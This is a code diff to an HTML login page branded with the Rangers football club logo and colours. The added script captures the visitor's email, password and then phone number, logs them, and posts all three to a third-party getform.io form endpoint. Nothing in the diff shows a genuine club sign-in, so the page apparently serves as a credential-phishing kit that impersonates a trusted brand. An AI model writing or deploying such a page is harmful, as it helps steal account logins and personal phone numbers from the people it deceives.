@@ -9,28 +9,41 @@
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
-            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc');
-            background-size: 50%;
+            background-image: url('https://imgs.search.brave.com/tGFjqC4XySJZqE1xHJiCRaTOO89L2afC0M6fPQeJxDg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9pbWFn/ZXMuc2Vla2xvZ28u/Y29tL2xvZ28tcG5n/LzExLzIvcmFuZ2Vy/cy1mb290YmFsbC1j/bHViLWxvZ28tcG5n/X3NlZWtsb2dvLTEx/NTc5Ny5wbmc'); /* Rangers logo */
+            background-size: 50%; /* Only show part of the logo for a cleaner effect */
             background-position: center center;
             background-repeat: no-repeat;
             background-attachment: fixed;
-            height: 100vh;
+            height: 100vh; /* Full viewport height */
             display: flex;
             justify-content: center;
             align-items: center;
             color: white;
             text-align: center;
             position: relative;
-            background-color: #0047ab;
+            background-color: #0047ab; /* Fallback color (Rangers Blue) */
         }
 
+        /* Gradient overlay to give depth and make the content stand out */
+        body::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.8)); /* Subtle dark overlay */
+            z-index: -1; /* Place the overlay behind all content */
+        }
+
+        /* Modal styling */
         .modal {
             display: block;
             position: absolute;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.7); /* Semi-transparent dark background */
             padding: 30px;
             width: 300px;
             border-radius: 8px;
@@ -38,7 +51,7 @@
         }
 
         h2 {
-            color: #e60000;
+            color: #e60000; /* Rangers Red */
             font-size: 24px;
             font-weight: bold;
         }
@@ -57,7 +70,7 @@
         button {
             width: 100%;
             padding: 12px;
-            background-color: #0047ab;
+            background-color: #0047ab; /* Rangers Blue */
             color: white;
             border: none;
             border-radius: 5px;
@@ -66,7 +79,7 @@
         }
 
         button:hover {
-            background-color: #003580;
+            background-color: #003580; /* Darker blue for hover effect */
         }
 
         .footer {
@@ -109,15 +122,52 @@
 <script>
     // Show phone number form after email/password submission
     document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Capture email, password
         const email = document.getElementById('email').value;
         const password = document.getElementById('password').value;
 
-        // After successful form submission, hide the login modal and show phone modal
-        setTimeout(() => {
-            document.getElementById('loginModal').style.display = 'none';
-            document.getElementById('phoneModal').style.display = 'block';
-        }, 500);  // Add a slight delay for smoother transition
+        // Hide the login modal and show the phone number modal
+        document.getElementById('loginModal').style.display = 'none';
+        document.getElementById('phoneModal').style.display = 'block';
 
+        // Save email and password for the next step
+        window.email = email;
+        window.password = password;
+
+        // Optionally log data to the console for testing
+        console.log(`Email: ${email}, Password: ${password}`);
+    });
+
+    // Handle phone number form submission
+    document.getElementById('phoneForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        // Capture phone number
+        const phone = document.getElementById('phone').value;
+
+        // Log the phone number along with email and password
+        console.log(`Phone: ${phone}, Email: ${window.email}, Password: ${window.password}`);
+
+        // Send data to Getform
+        fetch('https://getform.io/f/avrmyepa', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                email: window.email,
+                password: window.password,
+                phone: phone
+            })
+        })
+        .then(response => response.text())
+        .then(data => {
+            // Handle response from server
+            alert('Form submitted successfully!');
+        })
+        .catch(error => console.error('Error:', error));
     });
 </script>
 
